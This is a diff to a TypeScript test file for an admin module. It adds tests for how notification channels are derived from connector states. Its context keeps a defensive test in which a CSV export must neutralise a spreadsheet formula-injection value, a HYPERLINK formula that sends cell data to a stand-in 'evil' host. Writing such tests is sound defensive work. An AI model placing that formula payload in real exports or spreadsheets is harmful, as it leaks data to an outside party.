@@ -15,7 +15,7 @@ import {
   ACTIVITY_ICON, BLANK_MACHINE_TYPE, MT_CALENDAR_OPTIONS, MT_COST_TYPES, MT_FORM_BASES, MT_FORM_CALENDARS, NEW_COST_CATEGORY, NEW_ITP_SYSTEM, NEW_PHASE,
   PLUMB_VIEWS, SETTINGS_CARDS, activityChips, activityKindLabel, auditCsv, auditCsvFileName, connectorNeedsAttention, connectorTone, costCategoriesTotal,
   countText, healthRuleText, holidayEntry, isSettingsCardKey, locationTypeShortLabel, machineTypeKpis, machineTypeListSub, machineTypeUseText,
-  normaliseMachineTypeCode, parseActivitySource, parseBudgetInput, parsePercentInput, parsePlumbView, parseThresholdInput, paymentTerms, plumbingKpis,
+  normaliseMachineTypeCode, parseActivitySource, parseBudgetInput, parsePercentInput, parsePlumbView, parseThresholdInput, paymentTerms, plumbingKpis, notificationChannels,
   settingsEntry, settingsKpis, thresholdText, thresholdsError, type MachineTypeFacts,
 } from './admin';
 
@@ -240,5 +240,13 @@ describe('Activity & integrations rules (plumbKpis / actChips / actRows / connRo
     // Security review: a value a spreadsheet would run as a formula is neutralised with a leading quote.
     const evil = auditCsv([{ occurredAt: '2026-09-25T07:12:00.000Z', who: '@x', object: '=HYPERLINK("https://evil/?d="&A2,"x")', change: '+1', area: '-2', projectCode: null }]);
     expect(evil.split('\r\n')[1]).toBe(`2026-09-25T07:12:00.000Z,'@x,"'=HYPERLINK(""https://evil/?d=""&A2,""x"")",'+1,'-2,`);
+  });
+});
+
+describe('R-169 / R-021 — notification channels from the connectors', () => {
+  it('in-app always; a live channel connector disabled by IT (D-7a) is not a channel', () => {
+    expect(notificationChannels([])).toEqual({ count: 1, sub: 'In-app · e-mail and Teams not connected' });
+    expect(notificationChannels([{ name: 'E-mail (SMTP)', link: 'live', state: 'ok' }, { name: 'Microsoft Teams', link: 'live', state: 'disabled' }, { name: 'Codex', link: 'mock', state: 'mock' }]))
+      .toEqual({ count: 2, sub: 'In-app · e-mail · Teams not connected' });
   });
 });
